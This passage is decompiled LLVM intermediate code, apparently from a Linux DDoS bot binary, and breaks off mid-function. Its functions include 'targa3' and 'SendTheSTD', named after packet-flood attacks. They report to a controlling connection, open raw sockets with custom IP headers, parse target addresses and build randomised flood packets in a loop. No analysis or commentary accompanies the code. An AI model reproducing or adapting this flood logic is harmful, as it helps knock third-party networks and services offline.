  %v2_804d2fa = load i32, i32* %v1_804d2fa, align 4
  %v1_804d300 = call i32 @atol(i32 %v2_804d2fa)
  %v1_804d30e = add i32 %arg4, 12
  %v1_804d311 = inttoptr i32 %v1_804d30e to i32*
  %v2_804d311 = load i32, i32* %v1_804d311, align 4
  %v1_804d317 = call i32 @atol(i32 %v2_804d311)
  %v2_804d32b = inttoptr i32 %v2_804d2ef to i8*
  %v3_804d32b = call i32 @__GI_strchr(i8* %v2_804d32b, i32 44)
  %v1_804d333 = icmp eq i32 %v3_804d32b, 0
  br i1 %v1_804d333, label %dec_label_pc_804d3c0, label %dec_label_pc_804d33b

dec_label_pc_804d33b:                             ; preds = %dec_label_pc_804d2e9
  store i32 %v2_804d2ef, i32* @eax, align 4
  %v2_804d347 = call i32 @__GI_strtok(i32 %v2_804d2ef, i32 ptrtoint (i32* @global_var_806986d.168 to i32))
  %v4_804d3b833 = icmp eq i32 %v2_804d347, 0
  %v1_804d3bc34 = icmp eq i1 %v4_804d3b833, false
  br i1 %v1_804d3bc34, label %dec_label_pc_804d354, label %dec_label_pc_804d419

dec_label_pc_804d354:                             ; preds = %dec_label_pc_804d33b, %dec_label_pc_804d3a3
  %storemerge1335 = phi i32 [ %v2_804d3ad, %dec_label_pc_804d3a3 ], [ %v2_804d347, %dec_label_pc_804d33b ]
  %v0_804d354 = call i32 @listFork()
  store i32 %v0_804d354, i32* @eax, align 4
  %v1_804d359 = icmp eq i32 %v0_804d354, 0
  %v1_804d35b = icmp eq i1 %v1_804d359, false
  br i1 %v1_804d35b, label %dec_label_pc_804d3a3, label %dec_label_pc_804d35d

dec_label_pc_804d35d:                             ; preds = %dec_label_pc_804d354
  %v3_804d37d = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8069a98.186 to i32))
  %v3_804d391 = trunc i32 %v1_804d300 to i16
  %v4_804d391 = call i32 @SendTheSTD(i32 %storemerge1335, i16 %v3_804d391, i32 %v1_804d317)
  %v1_804d39e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804d3a3:                             ; preds = %dec_label_pc_804d354
  %v2_804d3ad = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806986d.168 to i32))
  %v4_804d3b8 = icmp eq i32 %v2_804d3ad, 0
  %v1_804d3bc = icmp eq i1 %v4_804d3b8, false
  br i1 %v1_804d3bc, label %dec_label_pc_804d354, label %dec_label_pc_804d419

dec_label_pc_804d3c0:                             ; preds = %dec_label_pc_804d2e9
  %v0_804d3c0 = call i32 @listFork()
  %v1_804d3c5 = icmp eq i32 %v0_804d3c0, 0
  br i1 %v1_804d3c5, label %dec_label_pc_804d3d3, label %dec_label_pc_804d3c9

dec_label_pc_804d3c9:                             ; preds = %dec_label_pc_804d3c0
  %v1_804d3ce = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804d3d3

dec_label_pc_804d3d3:                             ; preds = %dec_label_pc_804d3c0, %dec_label_pc_804d3c9
  %v3_804d3f3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8069a98.186 to i32))
  %v3_804d407 = trunc i32 %v1_804d300 to i16
  %v4_804d407 = call i32 @SendTheSTD(i32 %v2_804d2ef, i16 %v3_804d407, i32 %v1_804d317)
  %v1_804d414 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804d419:                             ; preds = %dec_label_pc_804d33b, %dec_label_pc_804d3a3, %entry
  %v0_804d41a = phi i32 [ %v1_804d2b3, %entry ], [ %v2_804d347, %dec_label_pc_804d33b ], [ %v2_804d3ad, %dec_label_pc_804d3a3 ]
  ret i32 %v0_804d41a

; uselistorder directives
  uselistorder i32 %v2_804d3ad, { 0, 2, 1 }
  uselistorder i32 %v2_804d2ef, { 3, 0, 2, 1 }
  uselistorder i32 %v4_804d2c3, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d419, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d3d3, { 1, 0 }
  uselistorder label %dec_label_pc_804d354, { 1, 0 }
  uselistorder label %dec_label_pc_804d2e9, { 1, 0 }
}

define i32 @targa3(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %tmp20 = ptrtoint i32* %arg4 to i32
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-996 = alloca i32, align 4
  %stack_var_-992 = alloca i32, align 4
  %stack_var_-952 = alloca i32, align 4
  %stack_var_-1052 = alloca i8*, align 4
  %stack_var_-1036 = alloca i32, align 4
  %v5_804d427 = icmp ult i32* %stack_var_-1036, inttoptr (i32 12 to i32*)
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  %v8_804d42a = inttoptr i32 %arg2 to i8*
  store i8* %v8_804d42a, i8** %stack_var_-1052, align 4
  %v2_804d42d = call i32 @mfork(i32 %arg2)
  store i32 %v2_804d42d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d435 = icmp eq i32 %v2_804d42d, 0
  %v1_804d437 = icmp eq i1 %v1_804d435, false
  br i1 %v1_804d437, label %dec_label_pc_804da52, label %dec_label_pc_804d43d

dec_label_pc_804d43d:                             ; preds = %entry
  %v5_804d43d = icmp ult i32* %stack_var_-1036, inttoptr (i32 4 to i32*)
  store i1 %v5_804d43d, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-1052, align 4
  %v5_804d449 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804d449, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d454 = icmp slt i32 %v5_804d449, 0
  %v1_804d458 = icmp eq i1 %v5_804d454, false
  br i1 %v1_804d458, label %dec_label_pc_804d464, label %dec_label_pc_804d45a

dec_label_pc_804d45a:                             ; preds = %dec_label_pc_804d43d
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-1052, align 4
  %v2_804d45f = call i32 @__GI_exit(i32 1)
  store i32 %v2_804d45f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d464

dec_label_pc_804d464:                             ; preds = %dec_label_pc_804d43d, %dec_label_pc_804d45a
  %v4_804d464 = add i32 %arg3, -1
  %v8_804d464 = icmp eq i32 %arg3, 0
  %v9_804d464 = sub i32 0, %arg3
  %v10_804d464 = and i32 %arg3, %v9_804d464
  %v11_804d464 = icmp slt i32 %v10_804d464, 0
  store i1 %v8_804d464, i1* %cf.global-to-local, align 1
  %v12_804d464 = icmp eq i32 %v4_804d464, 0
  %v13_804d464 = icmp slt i32 %v4_804d464, 0
  %v3_804d468 = icmp eq i1 %v13_804d464, %v11_804d464
  %v4_804d468 = icmp eq i1 %v12_804d464, false
  %v5_804d468 = and i1 %v4_804d468, %v3_804d468
  br i1 %v5_804d468, label %dec_label_pc_804d48a, label %dec_label_pc_804d46a

dec_label_pc_804d46a:                             ; preds = %dec_label_pc_804d464
  %v0_804d46a = load i32, i32* @esp, align 4
  %v5_804d46a = icmp ult i32 %v0_804d46a, 4
  store i1 %v5_804d46a, i1* %cf.global-to-local, align 1
  %v8_804d475 = inttoptr i32 %arg1 to i8*
  store i8* %v8_804d475, i8** %stack_var_-1052, align 4
  %v4_804d478 = call i32 @Send(i32 %arg1, i32 ptrtoint ([48 x i8]* @global_var_8069ab8.187 to i32))
  store i32 %v4_804d478, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-1052, align 4
  %v2_804d485 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804d485, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d48a

dec_label_pc_804d48a:                             ; preds = %dec_label_pc_804d464, %dec_label_pc_804d46a
  %v9_804d48a = icmp ult i32 %arg3, 201
  store i1 %v9_804d48a, i1* %cf.global-to-local, align 1
  %v7_804d491 = icmp sgt i32 %arg3, 201
  br i1 %v7_804d491, label %dec_label_pc_804d493, label %dec_label_pc_804d4b3

dec_label_pc_804d493:                             ; preds = %dec_label_pc_804d48a
  %v0_804d493 = load i32, i32* @esp, align 4
  %v5_804d493 = icmp ult i32 %v0_804d493, 4
  store i1 %v5_804d493, i1* %cf.global-to-local, align 1
  %v8_804d49e = inttoptr i32 %arg1 to i8*
  store i8* %v8_804d49e, i8** %stack_var_-1052, align 4
  %v4_804d4a1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_8069ae8.188 to i32))
  store i32 %v4_804d4a1, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-1052, align 4
  %v2_804d4ae = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804d4ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d4b3

dec_label_pc_804d4b3:                             ; preds = %dec_label_pc_804d48a, %dec_label_pc_804d493
  %v0_804d4b3 = load i32, i32* @esp, align 4
  %v5_804d4b3 = icmp ult i32 %v0_804d4b3, 4
  store i1 %v5_804d4b3, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-1052, align 4
  %v5_804d4bf = call i32 @socket(i32 2, i32 3, i32 255)
  %v0_804d4c4 = load i32, i32* @esp, align 4
  %v2_804d4c4 = icmp ugt i32 %v0_804d4c4, -17
  store i1 %v2_804d4c4, i1* %cf.global-to-local, align 1
  %tmp70 = bitcast i32* %stack_var_-952 to i8*
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d4ed = call i8* @_memset(i8* %tmp70, i32 0, i32 14)
  %v2_804d55d = ptrtoint i32* %stack_var_-992 to i32
  %tmp71 = bitcast i32* %stack_var_-992 to i8*
  store i32 %v2_804d55d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d572 = call i8* @_memset(i8* %tmp71, i32 0, i32 10)
  %v6_804d572 = ptrtoint i8* %v5_804d572 to i32
  store i32 %v6_804d572, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v15_804d5cc = ptrtoint i32* %stack_var_-996 to i32
  store i32 %v15_804d5cc, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-996, align 4
  %v0_804d5e5 = load i32, i32* @esp, align 4
  %v5_804d5e5 = icmp ult i32 %v0_804d5e5, 8
  store i1 %v5_804d5e5, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8069b2d.189, i32 0, i32 0), i8** %stack_var_-1052, align 4
  %v4_804d5ef = call i32 @open(i32 ptrtoint ([13 x i8]* @global_var_8069b2d.189 to i32), i32 0)
  store i32 %v4_804d5ef, i32* @global_var_807e0e0.190, align 32
  store i32 %v4_804d5ef, i32* %eax.global-to-local, align 4
  store i1 %v5_804d43d, i1* %cf.global-to-local, align 1
  %v5_804d60e = inttoptr i32 %v4_804d5ef to i8*
  store i8* %v5_804d60e, i8** %stack_var_-1052, align 4
  %v5_804d60f = call i32 @read(i32 %v4_804d5ef, i32 ptrtoint (i32* @global_var_807cca0.191 to i32), i32 4095)
  store i32 %v5_804d60f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @global_var_807cb78.192, align 8
  %v5_804d621 = icmp ult i32* %stack_var_-1036, inttoptr (i32 8 to i32*)
  store i1 %v5_804d621, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-1052, align 4
  %v4_804d628 = call i32 @realrand(i32 1, i32 7)
  store i32 %v4_804d628, i32* %eax.global-to-local, align 4
  store i32 %v4_804d628, i32* @ebx, align 4
  store i1 %v5_804d621, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-1052, align 4
  %v4_804d639 = call i32 @realrand(i32 0, i32 1)
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  %v0_804d644 = load i32, i32* @ebx, align 4
  %v5_804d644 = inttoptr i32 %v0_804d644 to i8*
  store i8* %v5_804d644, i8** %stack_var_-1052, align 4
  %v2_804d64d = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_804d64d, i32* %eax.global-to-local, align 4
  %v4_804d651 = call i32 @__GI_snprintf(i32 %v2_804d64d, i32 15, i32 ptrtoint ([9 x i8]* @global_var_8069b3a.193 to i32))
  store i1 %v5_804d621, i1* %cf.global-to-local, align 1
  store i32 %v2_804d64d, i32* %eax.global-to-local, align 4
  store i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8069b44.194, i32 0, i32 0), i8** %stack_var_-1052, align 4
  %v6_804d665 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8069b44.194, i32 0, i32 0), i32* nonnull %stack_var_-80)
  %v0_804d66d = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804d66d = ptrtoint i8* %v0_804d66d to i32
  store i32 %v1_804d66d, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* %v0_804d66d, i8** %stack_var_-1052, align 4
  %v2_804d676 = call i32 @fflush(i32 %v1_804d66d)
  store i32 1, i32* %eax.global-to-local, align 4
  %v10_804d75880 = icmp ugt i32 %arg3, 1
  store i1 %v10_804d75880, i1* %cf.global-to-local, align 1
  %v5_804d75b86 = icmp sgt i32 %arg3, 1
  br i1 %v5_804d75b86, label %dec_label_pc_804d68a, label %dec_label_pc_804d761.thread

dec_label_pc_804d761.thread:                      ; preds = %dec_label_pc_804d4b3
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d767

dec_label_pc_804d68a:                             ; preds = %dec_label_pc_804d4b3, %dec_label_pc_804d752
  %storemerge589 = phi i32 [ %v4_804d752, %dec_label_pc_804d752 ], [ 1, %dec_label_pc_804d4b3 ]
  %stack_var_-44.188 = phi i32 [ %stack_var_-44.0, %dec_label_pc_804d752 ], [ 0, %dec_label_pc_804d4b3 ]
  %stack_var_-36.187 = phi i32 [ %stack_var_-36.0, %dec_label_pc_804d752 ], [ 1, %dec_label_pc_804d4b3 ]
  %v2_804d68d = mul i32 %storemerge589, 4
  %v5_804d690 = add i32 %v2_804d68d, %tmp20
  %v1_804d693 = add i32 %v5_804d690, -4
  %v5_804d693 = icmp ult i32 %v5_804d690, 4
  store i1 %v5_804d693, i1* %cf.global-to-local, align 1
  store i32 %v1_804d693, i32* %eax.global-to-local, align 4
  %v1_804d696 = inttoptr i32 %v1_804d693 to i32*
  %v2_804d696 = load i32, i32* %v1_804d696, align 4
  store i32 %v2_804d696, i32* %eax.global-to-local, align 4
  store i32 3, i32* %stack_var_-1036, align 4
  store i1 false, i1* @df, align 1
  %v4_804d6b3 = inttoptr i32 %v2_804d696 to i8*
  store i32 %v2_804d696, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8069b72.195 to i32), i32* @edi, align 4
  %v7_804d6c5 = call i32 @_strncmp(i8* %v4_804d6b3, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8069b72.195, i32 0, i32 0), i32 3)
  %v8_804d6c5 = urem i32 %v7_804d6c5, 2
  %v9_804d6c5 = icmp eq i32 %v8_804d6c5, 0
  %v0_804d6c7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d6c7 = or i1 %v0_804d6c7, %v9_804d6c5
  %v3_804d6c7 = zext i1 %v2_804d6c7 to i32
  %v4_804d6c7 = load i32, i32* @edx, align 4
  %v5_804d6c7 = and i32 %v4_804d6c7, -256
  %v6_804d6c7 = or i32 %v3_804d6c7, %v5_804d6c7
  %v7_804d6c7 = xor i32 %v6_804d6c7, 1
  store i32 %v7_804d6c7, i32* @edx, align 4
  %v1_804d6cf = trunc i32 %v7_804d6c7 to i8
  %v3_804d6cf = zext i1 %v0_804d6c7 to i8
  %v15_804d6cf = icmp eq i8 %v1_804d6cf, %v3_804d6cf
  %v1_804d6d8 = icmp eq i1 %v15_804d6cf, false
  store i32 %v5_804d690, i32* %eax.global-to-local, align 4
  %v1_804d71b = inttoptr i32 %v5_804d690 to i32*
  %v2_804d71b = load i32, i32* %v1_804d71b, align 4
  store i32 %v2_804d71b, i32* %eax.global-to-local, align 4
  %v0_804d71d = load i32, i32* @esp, align 4
  %v5_804d71d = icmp ult i32 %v0_804d71d, 12
  store i1 %v5_804d71d, i1* %cf.global-to-local, align 1
  %v5_804d720 = inttoptr i32 %v2_804d71b to i8*
  store i8* %v5_804d720, i8** %stack_var_-1052, align 4
  br i1 %v1_804d6d8, label %dec_label_pc_804d712, label %dec_label_pc_804d6da

dec_label_pc_804d6da:                             ; preds = %dec_label_pc_804d68a
  %v2_804d6e9 = call i32 @atol(i32 %v2_804d71b)
  store i32 %v2_804d6e9, i32* %eax.global-to-local, align 4
  %v6_804d6f1 = icmp eq i32 %v2_804d6e9, 0
  store i1 %v6_804d6f1, i1* %cf.global-to-local, align 1
  %v7_804d6f4 = icmp sgt i32 %v2_804d6e9, 1
  br i1 %v7_804d6f4, label %dec_label_pc_804d6f6, label %dec_label_pc_804d752

dec_label_pc_804d6f6:                             ; preds = %dec_label_pc_804d6da
  store i32 %v5_804d690, i32* %eax.global-to-local, align 4
  %v2_804d6ff = load i32, i32* %v1_804d71b, align 4
  store i32 %v2_804d6ff, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  %v5_804d704 = inttoptr i32 %v2_804d6ff to i8*
  store i8* %v5_804d704, i8** %stack_var_-1052, align 4
  %v2_804d705 = call i32 @atol(i32 %v2_804d6ff)
  store i32 %v2_804d705, i32* %eax.global-to-local, align 4
  %v0_804d70a = load i32, i32* @esp, align 4
  %v2_804d70a = icmp ugt i32 %v0_804d70a, -17
  store i1 %v2_804d70a, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d752

dec_label_pc_804d712:                             ; preds = %dec_label_pc_804d68a
  %v2_804d721 = call i32 @inet_addr(i32 %v2_804d71b)
  store i32 %v2_804d721, i32* %eax.global-to-local, align 4
  %v5_804d729 = icmp ne i32 %v2_804d721, -1
  store i1 %v5_804d729, i1* %cf.global-to-local, align 1
  %v10_804d729 = icmp eq i32 %v2_804d721, -1
  br i1 %v10_804d729, label %dec_label_pc_804d752, label %dec_label_pc_804d72e

dec_label_pc_804d72e:                             ; preds = %dec_label_pc_804d712
  store i32 %stack_var_-44.188, i32* @ebx, align 4
  store i32 %v5_804d690, i32* %eax.global-to-local, align 4
  %v2_804d73a = load i32, i32* %v1_804d71b, align 4
  store i32 %v2_804d73a, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  %v5_804d73f = inttoptr i32 %v2_804d73a to i8*
  store i8* %v5_804d73f, i8** %stack_var_-1052, align 4
  %v2_804d740 = call i32 @inet_addr(i32 %v2_804d73a)
  store i32 %v2_804d740, i32* %eax.global-to-local, align 4
  %v0_804d745 = load i32, i32* @esp, align 4
  %v2_804d745 = icmp ugt i32 %v0_804d745, -17
  store i1 %v2_804d745, i1* %cf.global-to-local, align 1
  %v1_804d748 = load i32, i32* @ebp, align 4
  %v2_804d748 = load i32, i32* @ebx, align 4
  %v3_804d748 = mul i32 %v2_804d748, 4
  %v4_804d748 = add i32 %v1_804d748, -892
  %v5_804d748 = add i32 %v4_804d748, %v3_804d748
  %v6_804d748 = inttoptr i32 %v5_804d748 to i32*
  store i32 %v2_804d740, i32* %v6_804d748, align 4
  %v4_804d74f = add i32 %stack_var_-44.188, 1
  br label %dec_label_pc_804d752

dec_label_pc_804d752:                             ; preds = %dec_label_pc_804d6da, %dec_label_pc_804d712, %dec_label_pc_804d6f6, %dec_label_pc_804d72e
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.187, %dec_label_pc_804d712 ], [ %stack_var_-36.187, %dec_label_pc_804d72e ], [ %v2_804d705, %dec_label_pc_804d6f6 ], [ %stack_var_-36.187, %dec_label_pc_804d6da ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.188, %dec_label_pc_804d712 ], [ %v4_804d74f, %dec_label_pc_804d72e ], [ %stack_var_-44.188, %dec_label_pc_804d6f6 ], [ %stack_var_-44.188, %dec_label_pc_804d6da ]
  %v4_804d752 = add nuw nsw i32 %storemerge589, 1
  store i32 %v4_804d752, i32* %eax.global-to-local, align 4
  %v10_804d758 = icmp ult i32 %v4_804d752, %arg3
  store i1 %v10_804d758, i1* %cf.global-to-local, align 1
  %exitcond93 = icmp eq i32 %v4_804d752, %arg3
  br i1 %exitcond93, label %dec_label_pc_804d761, label %dec_label_pc_804d68a

dec_label_pc_804d761:                             ; preds = %dec_label_pc_804d752
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d761 = icmp eq i32 %stack_var_-44.0, 0
  %v1_804d765 = icmp eq i1 %v4_804d761, false
  br i1 %v1_804d765, label %dec_label_pc_804d761.dec_label_pc_804d787_crit_edge, label %dec_label_pc_804d767

dec_label_pc_804d761.dec_label_pc_804d787_crit_edge: ; preds = %dec_label_pc_804d761
  %.pre = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_804d787

dec_label_pc_804d767:                             ; preds = %dec_label_pc_804d761.thread, %dec_label_pc_804d761
  %stack_var_-44.1.lcssa100 = phi i32 [ 0, %dec_label_pc_804d761.thread ], [ %stack_var_-44.0, %dec_label_pc_804d761 ]
  %stack_var_-36.1.lcssa98 = phi i32 [ 1, %dec_label_pc_804d761.thread ], [ %stack_var_-36.0, %dec_label_pc_804d761 ]
  %v0_804d767 = load i32, i32* @esp, align 4
  %v5_804d767 = icmp ult i32 %v0_804d767, 4
  store i1 %v5_804d767, i1* %cf.global-to-local, align 1
  %v8_804d772 = inttoptr i32 %arg1 to i8*
  store i8* %v8_804d772, i8** %stack_var_-1052, align 4
  %v4_804d775 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8069b78.196 to i32))
  store i32 %v4_804d775, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-1052, align 4
  %v2_804d782 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804d782, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d787

dec_label_pc_804d787:                             ; preds = %dec_label_pc_804d761.dec_label_pc_804d787_crit_edge, %dec_label_pc_804d767
  %stack_var_-44.1.lcssa99 = phi i32 [ %stack_var_-44.0, %dec_label_pc_804d761.dec_label_pc_804d787_crit_edge ], [ %stack_var_-44.1.lcssa100, %dec_label_pc_804d767 ]
  %stack_var_-36.1.lcssa97 = phi i32 [ %stack_var_-36.0, %dec_label_pc_804d761.dec_label_pc_804d787_crit_edge ], [ %stack_var_-36.1.lcssa98, %dec_label_pc_804d767 ]
  %v8_804d792.pre-phi = phi i8* [ %.pre, %dec_label_pc_804d761.dec_label_pc_804d787_crit_edge ], [ %v8_804d772, %dec_label_pc_804d767 ]
  store i8* %v8_804d792.pre-phi, i8** %stack_var_-1052, align 4
  %v4_804d795 = call i32 @Send(i32 %arg1, i32 ptrtoint ([44 x i8]* @global_var_8069b98.197 to i32))
  store i32 %v4_804d795, i32* %eax.global-to-local, align 4
  %v0_804d79a = load i32, i32* @esp, align 4
  %v2_804d79a = icmp ugt i32 %v0_804d79a, -17
  store i1 %v2_804d79a, i1* %cf.global-to-local, align 1
  %v0_804d79d = load i8*, i8** %stack_var_-1052, align 4
  %v1_804d79d = ptrtoint i8* %v0_804d79d to i32
  %v2_804d79d = call i32 @__libc_getpid(i32 %v1_804d79d)
  store i32 %v2_804d79d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d79d, i32* @global_var_807cb60.198, align 32
  %v0_804d7a7 = load i32, i32* @esp, align 4
  %v5_804d7a7 = icmp ult i32 %v0_804d7a7, 8
  store i1 %v5_804d7a7, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 128 to i8*), i8** %stack_var_-1052, align 4
  %v4_804d7b4 = call i32 @realrand(i32 128, i32 1024)
  %v1_804d7bc = add i32 %v4_804d7b4, 20
  store i32 %v1_804d7bc, i32* %eax.global-to-local, align 4
  store i1 %v5_804d621, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-1052, align 4
  %v5_804d7cb = call i32 @calloc(i64 1, i32 %v1_804d7bc)
  %tmp72 = bitcast i8** %stack_var_-32 to i32*
  store i32 %v5_804d7cb, i32* %tmp72, align 4
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  %v5_804d7d9 = inttoptr i32 %v5_804d7cb to i8*
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-1052, align 4
  %v7_804d7ed = call i32 @__GI_setsockopt(i32 %v5_804d4bf, i32 0, i32 3, i32 ptrtoint (i32* @global_var_8069bc4.199 to i32), i32 2)
  store i32 %v7_804d7ed, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-1052, align 4
  %v2_804d800 = call i32 @htons(i32 0)
  store i32 %v2_804d800, i32* %eax.global-to-local, align 4
  store i1 %v5_804d427, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-1052, align 4
  %v3_804d811 = call i32 @__GI_time(i32* null)
  store i32 %v3_804d811, i32* %eax.global-to-local, align 4
  %v0_804d816 = load i32, i32* @esp, align 4
  %v2_804d816 = icmp ugt i32 %v0_804d816, -17
  store i1 %v2_804d816, i1* %cf.global-to-local, align 1
  %v1_804da33 = add i32 %stack_var_-44.1.lcssa99, 1
  %v1_804d8f4 = add i32 %v5_804d7cb, 1
  %v2_804d8f4 = inttoptr i32 %v1_804d8f4 to i8*
  %v1_804d8fb = urem i32 %v1_804d7bc, 65536
  %v3_804d911 = add i32 %v5_804d7cb, 2
  %v4_804d911 = inttoptr i32 %v3_804d911 to i16*
  %v3_804d93d = add i32 %v5_804d7cb, 4
  %v4_804d93d = inttoptr i32 %v3_804d93d to i16*
  %v1_804d944 = add i32 %v5_804d7cb, 8
  %v2_804d944 = inttoptr i32 %v1_804d944 to i8*
  %v3_804d963 = add i32 %v5_804d7cb, 9
  %v4_804d963 = inttoptr i32 %v3_804d963 to i8*
  %v3_804d992 = add i32 %v5_804d7cb, 6
  %v4_804d992 = inttoptr i32 %v3_804d992 to i16*
  %v1_804d999 = add i32 %v5_804d7cb, 10
  %v2_804d999 = inttoptr i32 %v1_804d999 to i16*
  %v2_804d9a9 = add i32 %v5_804d7cb, 12
  %v3_804d9a9 = inttoptr i32 %v2_804d9a9 to i32*
  %v2_804d9b9 = add i32 %v5_804d7cb, 16
  %v3_804d9b9 = inttoptr i32 %v2_804d9b9 to i32*
  %v2_804d9bc = ptrtoint i32* %stack_var_-96 to i32
  %v5_804da04 = add i32 %v3_804d811, %stack_var_-36.1.lcssa97
  %v8_804da3774 = icmp sgt i32 %v1_804da33, 0
  br label %dec_label_pc_804d823

dec_label_pc_804d823:                             ; preds = %dec_label_pc_804da3d, %dec_label_pc_804d787
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_804d787 ], [ %stack_var_-20.2.lcssa, %dec_label_pc_804da3d ]
  br label %dec_label_pc_804da30.preheader

dec_label_pc_804d83b:                             ; preds = %dec_label_pc_804da30.preheader, %dec_label_pc_804da2a
  %storemerge476 = phi i32 [ %v4_804da2d, %dec_label_pc_804da2a ], [ 0, %dec_label_pc_804da30.preheader ]
  %stack_var_-20.275 = phi i32 [ %v4_804da2a, %dec_label_pc_804da2a ], [ %stack_var_-20.377, %dec_label_pc_804da30.preheader ]
  store i32 %storemerge476, i32* %eax.global-to-local, align 4
  %v0_804d83e = load i32, i32* @ebp, align 4
  %v2_804d83e = mul i32 %storemerge476, 4
  %v3_804d83e = add i32 %v2_804d83e, -892
  %v4_804d83e = add i32 %v0_804d83e, %v3_804d83e
  %v5_804d83e = inttoptr i32 %v4_804d83e to i32*
  %v6_804d83e = load i32, i32* %v5_804d83e, align 4
  %v0_804d848 = load i32, i32* @global_var_807cb78.192, align 8
  store i32 %v0_804d848, i32* %eax.global-to-local, align 4
  %v3_804d84d = icmp ult i32 %v0_804d848, 4000
  store i1 %v3_804d84d, i1* %cf.global-to-local, align 1
  %v7_804d852 = icmp sgt i32 %v0_804d848, 4000
  br i1 %v7_804d852, label %dec_label_pc_804d854, label %dec_label_pc_804d83b.dec_label_pc_804d879_crit_edge

dec_label_pc_804d83b.dec_label_pc_804d879_crit_edge: ; preds = %dec_label_pc_804d83b
  %v0_804d882.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d879

dec_label_pc_804d854:                             ; preds = %dec_label_pc_804d83b
  %v0_804d854 = load i32, i32* @global_var_807e0e0.190, align 32
  store i32 %v0_804d854, i32* %eax.global-to-local, align 4
  %v0_804d859 = load i32, i32* @esp, align 4
  %v5_804d859 = icmp ult i32 %v0_804d859, 4
  store i1 %v5_804d859, i1* %cf.global-to-local, align 1
  %v1_804d85c = add i32 %v0_804d859, -8
